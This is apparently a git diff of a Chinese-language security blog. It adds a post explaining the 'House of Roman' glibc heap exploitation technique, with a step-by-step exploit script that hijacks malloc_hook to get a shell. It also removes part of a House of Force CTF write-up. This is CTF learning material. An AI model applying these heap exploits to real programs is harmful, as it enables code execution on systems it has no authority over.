@@ -156,6 +156,156 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/House%20Of%20Roman-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/13/House%20Of%20Roman-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Roman-原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-13 15:20:46" itemprop="dateCreated datePublished" datetime="2022-03-13T15:20:46+08:00">2022-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-06 14:42:22" itemprop="dateModified" datetime="2022-04-06T14:42:22+08:00">2022-04-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Roman"><a href="#House-Of-Roman" class="headerlink" title="House Of Roman"></a>House Of Roman</h2><p>House of Roman 的一个核心思路就是利用 <strong>局部写</strong> 减少随机化的程度，从而给出爆破的可能</p>
+<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的，且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下，就能完成利用（当然也可以来绕 PIE）</p>
+<ul>
+<li>利用 off-by-one 把原本不可能进入 fastbin 的 unsorted chunk 进行修改（修改 size 到 fastbin 的范围），使遗留有“main_arena+xx”的chunk进入 fastbin</li>
+<li>利用 UAF 修改遗留在 fast chunk 中的“main_arena+xx”，使其指向目标地址</li>
+</ul>
+<hr>
+<h2 id="House-Of-Roman-利用姿势"><a href="#House-Of-Roman-利用姿势" class="headerlink" title="House Of Roman 利用姿势"></a>House Of Roman 利用姿势</h2><p><strong>外国老哥给了一个 demo：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    v5 = malloc_chunk(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    write_chunk(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">    free_chunk();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>malloc_chunk：用户输入 <code>size</code>, 然后 <code>malloc(size)</code> , 大小不限</li>
+<li>write_chunk：往指定 <code>heap_ptr</code> 写入 <code>size+1</code> 字节数据，off-by-one（<code>Write</code>时只是校验指针是否为<code>0</code>）</li>
+<li>free_chunk：调用 <code>free</code> 释放掉 <code>heap_ptr</code> ，不过没有清零，<code>double free</code> 和 <code>uaf</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptrs[(<span class="keyword">unsigned</span> __int64)v0]); <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>保护如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">04</span>:<span class="number">44</span> haclh@ubuntu:house_of_roman $ checksec ./new_chall</span><br><span class="line">[*] <span class="string">&#x27;/home/haclh/workplace/house_of_roman/new_chall&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p><strong>分析外国老哥的exp：</strong></p>
+<p>一，分配 <code>3</code> 个 <code>chunk</code> ，在 <code>chunk2 + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ，用于后面 的 <code>fastbin attack</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># chunk1 </span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2 </span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>) <span class="comment"># chunk3 </span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;create 2 chunk, 0x20, 0xd8&quot;</span>)</span><br><span class="line">fake = <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake) <span class="comment"># set fakesize:0x71</span></span><br><span class="line">info(<span class="string">&quot;fake&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>二，释放掉 <code>chunk2</code> , 然后分配同样大小再次分配到 <code>chunk2</code> , 此时 <code>chunk2+0x10</code> 和 <code>chunk2+0x18</code> 中有 <code>main_arean</code> 的地址，分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off-by-one</code> 修改 <code>chunk2-&gt;size = 0x71</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>) <span class="comment"># chunk2 to unsortedbin</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2 new(include main_arena+88)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">3</span>) <span class="comment"># chunk4</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">15</span>) <span class="comment"># chunk16</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">18</span>) <span class="comment"># chunk19</span></span><br><span class="line"></span><br><span class="line">over = <span class="string">&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over) <span class="comment"># set chunk2-&gt;size =&gt; 0x71(编辑chunk1,溢出到chunk2)</span></span><br><span class="line">info(<span class="string">&quot;利用 off by one ,  chunk2&#x27;s size --&gt; 0x71&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>这里的 off-by-one 保证了 chunk2 可以进入大小为“0x70~0x80”的 fastbin</p>
+<p>这样“main_arena+88”就会进入 fastbin 了（方便后续的 UAF 进行修改）</p>
+<p>三，生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>chunk1</code> 链入到 <code>fastbin</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">info(<span class="string">&quot;创建两个 0x70 的 fastbin&quot;</span>)</span><br><span class="line">heap_po = <span class="string">&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">info(<span class="string">&quot;把 chunk1 链入到 fastbin 里面&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x555555757160</span> —▸ <span class="number">0x555555757020</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>0x555555757160 就是 chunk4</li>
+<li>0x555555757020 就是 chunk1(原本该是chunk3,但是末尾字节被覆盖了) </li>
+</ul>
+<p>四，通过修改 <code>chunk1-&gt;fd</code> 的低 <code>2</code> 字节， 使得 <code>chunk1-&gt;fd= malloc_hook - 0x23</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">&quot;\xed\x1a&quot;</span> <span class="comment"># 该地址为 malloc_hook 上方</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line">info(<span class="string">&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>即把“main_arena+88”覆盖为“malloc_hook - 0x23”</p>
+<p>五，然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code> 所在的那个 <code>chunk</code> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">info(<span class="string">&quot;0 拿到了 malloc_hook&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>注意：这里设置的是“malloc_hook - 0x23”，存在“\x7f”来通过检查</p>
+<p>六，释放掉 <code>chunk16</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>chunk16-&gt;fd = 0</code> ， 修复了 <code>fastbin</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>)) </span><br><span class="line">info(<span class="string">&quot;再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>现在 fastbin 中只留有 chunk16 的地址（这个“修复”是什么意思，没有搞明白）</p>
+<p>七，unsortedbin attack，使得 malloc_hook 被写入 main_arena+88 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>) <span class="comment"># chunk3</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>) <span class="comment"># chunk4</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>) <span class="comment"># chunk5</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 大小为&quot;0xc8+0x10&quot;的chunk2进入unsortedbin</span></span><br><span class="line">po = <span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">&quot;\x00\x1b&quot;</span> <span class="comment"># 覆写FD的低地址,使其变为malloc_hook</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># 把chunk2申请回来,使malloc_hook变成unsortedbin中的最后一个chunk</span></span><br><span class="line">info(<span class="string">&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>根据 unsortedbin 的特性，它会向 <code>第一个chunk</code> 和 <code>最后一个chunk</code> 中写入 <code>main_arena+xx</code> ，修改其FD指向 <code>malloc_hook</code> ，<code>最后一个chunk</code> 就变为了 <code>malloc_hook</code> ，当然会被写入 <code>main_arena+88</code></p>
+<p>八，修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">over = <span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;malloc_hook to one_gadget&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>九，然后 <code>free</code> 两次同一个 <code>chunk</code> ，触发 <code>malloc_printerr</code> ， <code>getshell</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
+<p>上面的偏移均为调试所得，开启 <code>aslr</code> 后，需要爆破程序</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>UAF（对 fastbin 中的“main_arena+xx”进行修改，使其指向目标地址）</li>
+<li>off-by-one（覆写“size”的大小，为了使保留有“main_arena+xx”进入fastbin）</li>
+</ul>
+<h2 id="版本对-House-Of-Roman-的影响"><a href="#版本对-House-Of-Roman-的影响" class="headerlink" title="版本对 House Of Roman 的影响"></a>版本对 House Of Roman 的影响</h2><p>House Of Roman 并不依赖于 libc 源码，它的思想完全可以独立使用（覆盖main_arena）</p>
+<p>但是实现 House Of Roman 需要 fastbin attack，unsortedbin attack 等技术的配合，而它们会受 libc 版本影响：</p>
+<p><strong>libc-2.27</strong></p>
+<ul>
+<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
+<li>unsortedbin attack 可以直接打（只检查了“victim-&gt;size”，形同虚设）</li>
+</ul>
+<p><strong>libc-2.29</strong></p>
+<ul>
+<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
+<li>unsortedbin attack 失效（其实也有办法可以绕过，只是条件苛刻）</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/IO_2_1_stdout%20leak+Double%20free/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1867,114 +2017,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/05/House%20Of%20Force-2.23-64/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/05/House%20Of%20Force-2.23-64/" class="post-title-link" itemprop="url">House Of Force-2.23-64</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-03-05 01:39:45 / Modified: 10:20:39" itemprop="dateCreated datePublished" datetime="2022-03-05T01:39:45+08:00">2022-03-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>5.4k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>5 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>gyctf_2020_force</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./gyctf_2020_force </span><br><span class="line"><span class="number">1</span>:add</span><br><span class="line"><span class="number">2</span>:<span class="built_in">puts</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gyctf_2020_force: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">6</span>d464fea7805860b83ff9bc8f4467dd258ebd04f, stripped</span><br><span class="line"> </span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/gyctf_2020_force&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO <span class="comment">// 打不了GOT劫持</span></span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<p>64位，dynamically，全开</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 choice; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1:add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2:puts&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, data, <span class="number">0xF</span>uLL);</span><br><span class="line">    choice = atol(data);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts_s();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>标准堆模板</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> **i; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="keyword">const</span> <span class="keyword">void</span> **)&amp;chunk_list; *i; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span> *)i - (<span class="keyword">char</span> *)&amp;chunk_list &gt; <span class="number">39</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, data, <span class="number">0xF</span>uLL);</span><br><span class="line">  size = atol(data);</span><br><span class="line">  *i = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !*i )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bin addr %p\n&quot;</span>, *i);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="keyword">void</span> *)*i, <span class="number">0x50</span>uLL);                 <span class="comment">// 堆溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>有一个溢出，输入“size”，读入“0x50”字节</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">puts_s</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 carnay; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  carnay = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;leak);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ carnay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>只能利用这个函数打 leak</p>
-<p><strong>入侵思路</strong></p>
-<p>先利用 mmap 获取 libc_base：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk1=add(<span class="number">0x200000</span>,<span class="string">&#x27;here&#x27;</span>)</span><br><span class="line">libc_base=chunk1+<span class="number">0x200ff0</span></span><br><span class="line">success(<span class="string">&#x27;chunk1 &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(chunk1))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
-<p>修改“topchunk-&gt;size”为“0xffffffffffffffff”：</p>
